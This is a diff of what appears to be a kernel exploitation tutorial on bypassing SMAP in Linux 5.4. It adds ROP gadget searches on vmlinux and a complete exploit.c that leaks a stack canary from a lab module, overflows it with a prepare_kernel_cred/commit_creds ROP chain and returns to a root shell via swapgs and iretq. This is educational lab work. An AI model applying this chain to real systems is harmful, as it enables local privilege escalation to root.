@@ -100,7 +100,44 @@ void cleanup_module(void)
 
 
 ## Building a Complete Escalation Chain
+We'll need several different gadgets to build our complete escalation chain. Let's look for a `pop rdi` gadget for function calls, these are quite easy to find.
+
+```
+~/pwnkernel $ rp++ -f linux-5.4/vmlinux -r 1 --unique | grep 'pop rdi ; ret'
+0xffffffff81001518: pop rdi ; ret  ;  (7337 found)
 ...
+```
+
+We'll also need a `swapgs` instruction in order to return to user-space, this was also found quite easily.
+
+```
+~/pwnkernel $ rp++ -f linux-5.4/vmlinux -r 2 --unique | grep 'swapgs'
+0xffffffff81c00eaa: swapgs  ; popfq  ; ret  ;  (1 found)
+```
+
+One of the trickier gadgets to find was a gadget that allowed us to move the value of `rax` (a return value) into `rdi` for a subsequent function call. I settled on a `add rdi, rax` gadget.
+
+```
+~/pwnkernel $ rp++ -f linux-5.4/vmlinux -r 3 --unique | grep 'add rdi, rax'
+0xffffffff8158f72a: add rdi, rax ; cmp rdi, 0x01 ; setbe al ; ret  ;  (1 found)
+```
+
+Lastly, we need an `iret` instruction to return to user-space. This was a little annoying to find as `rp++` didn't seem to like finding `iret` instructions, so here's an `objdump` command that does the same thing.
+
+```
+~/pwnkernel $ objdump -j .text -d linux-5.4/vmlinux | grep 'iret'
+ffffffff8101a9e3:   e8 d8 4d 00 00          callq  ffffffff8101f7c0 <show_iret_regs>
+ffffffff8101c490 <fixup_bad_iret>:
+ffffffff8101c4d3:   74 04                   je     ffffffff8101c4d9 <fixup_bad_iret+0x49>
+ffffffff8101f7c0 <show_iret_regs>:
+ffffffff8101f856:   e9 65 ff ff ff          jmpq   ffffffff8101f7c0 <show_iret_regs>
+ffffffff81023cc2:   48 cf                   iretq
+...
+```
+
+Putting all these together we can construct a complete escalation chain that mimics the process that the kernel uses to return back to user-space, allowing us to bypass SMAP with a ROP chain.
+
+Note the `iret` frame at the end of the chain, this will sit at the top of our stack when the `iret` instruction is executed.
 
 ```c
 void overflow_buffer(int fd, unsigned long canary)
@@ -134,7 +171,9 @@ void overflow_buffer(int fd, unsigned long canary)
 
 
 ## Environment Setup
-...
+Taking our `launch.sh` script from the previous Linux kernel exploitation post (bypassing smep), all we need to add is the additional `+smap` flag to the `-cpu kvm64,+smep` line. 
+
+Note that we'll also be using linux kernel version 5.4, so make sure to update that if using a different kernel version.
 
 {{< code language="sh" title="launch.sh" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
 #!/bin/bash
@@ -162,7 +201,89 @@ popd
 ...
 
 {{< code language="c" title="exploit.c" id="2" expand="Show" collapse="Hide" isCollapsed="true" >}}
+#include <stdio.h>
+#include <stdlib.h>
+#include <assert.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+unsigned long save_ss, save_sp, save_rf, save_cs;
+
+void shell()
+{
+    system("/bin/sh");
+}
+
+void save_user_space()
+{
+    /* save user-space */
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov save_ss, ss;"
+        "mov save_sp, rsp;"
+        "pushf;"
+        "pop save_rf;"
+        "mov save_cs, cs;"
+        ".att_syntax;"
+    ); 
+}
+
+unsigned long leak_canary(int fd)
+{
+    unsigned long leak[5];
+    read(fd, leak, sizeof(unsigned long) * 5);
+    return leak[4];
+}
+
+void overflow_buffer(int fd, unsigned long canary)
+{
+    unsigned long payload[20];
+
+    payload[4] = canary;
+    
+    payload[5] = 0xffffffff81001518; // pop rdi; ret
+    payload[6] = 0x00;               // rdi = 0x00
+    payload[7] = 0xffffffff810881c0; // prepare_kernel_cred
+
+    payload[8]  = 0xffffffff81001518; // pop rdi; ret
+    payload[9]  = 0x00;               // rdi = 0x00
+    payload[10] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
+    payload[11] = 0xffffffff81087e80; // commit_creds
+
+    payload[12] = 0xffffffff81c00eaa; // swapgs; pop rbp; ret
+    payload[13] = 0x00;               // rbp = 0x00
+
+    payload[14] = 0xffffffff81023cc2; // iretq 
+    payload[15] = (unsigned long)shell;
+    payload[16] = save_cs;
+    payload[17] = save_rf;
+    payload[18] = save_sp;
+    payload[19] = save_ss;
+
+    write(fd, payload, sizeof(unsigned long) * 20);
+}
+
+int main(int argc, char **argv)
+{
+    save_user_space();
+
+    int fd = open("/proc/challenge", O_RDWR);
+    assert(fd > 0);
+
+    /* leak stack canary */
+    unsigned long canary = leak_canary(fd);
+    printf("[*] canary @ 0x%lx\n", canary);
+
+    overflow_buffer(fd, canary); 
+
+    return 0;
+}
 {{< /code >}}
+
+...
+
+```
+```
 
 
 ## Fixing the Exploit with a SIGSEGV Handler
